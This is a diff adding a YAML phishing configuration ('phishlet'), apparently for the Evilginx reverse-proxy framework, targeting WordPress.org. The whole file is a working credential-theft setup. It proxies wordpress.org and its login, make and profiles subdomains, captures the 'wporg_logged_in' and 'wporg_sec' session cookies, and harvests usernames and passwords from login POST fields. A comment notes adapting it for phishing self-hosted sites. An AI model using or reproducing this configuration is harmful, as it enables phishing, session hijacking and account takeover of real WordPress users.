@@ -1,0 +1,49 @@
+name: 'WordPress.org'
+author: '@antichristone'
+min_ver: '2.3.0'
+
+proxy_hosts:
+    # Proxy the primary domain.
+    - phish_sub: ''
+      orig_sub: ''
+      domain: 'wordpress.org'
+      session: true
+      is_landing: true
+
+    # These proxied should be removed when phishing self-hosted sites.
+    - phish_sub: 'login'
+      orig_sub: 'login'
+      domain: 'wordpress.org'
+      session: true
+      is_landing: false
+    - phish_sub: 'make'
+      orig_sub: 'make'
+      domain: 'wordpress.org'
+      session: true
+      is_landing: false
+    - phish_sub: 'profiles'
+      orig_sub: 'profiles'
+      domain: 'wordpress.org'
+      session: true
+      is_landing: false
+
+sub_filters: []
+
+auth_tokens:
+    - domain: '.wordpress.org'
+      keys: ['wporg_logged_in', 'wporg_sec']
+
+credentials:
+    username:
+        key: 'log'
+        search: '(.*)'
+        type: 'post'
+    password:
+        key: 'pwd'
+        search: '(.*)'
+        type: 'post'
+
+
+login:
+    domain: 'login.wordpress.org'
+    path: '/'
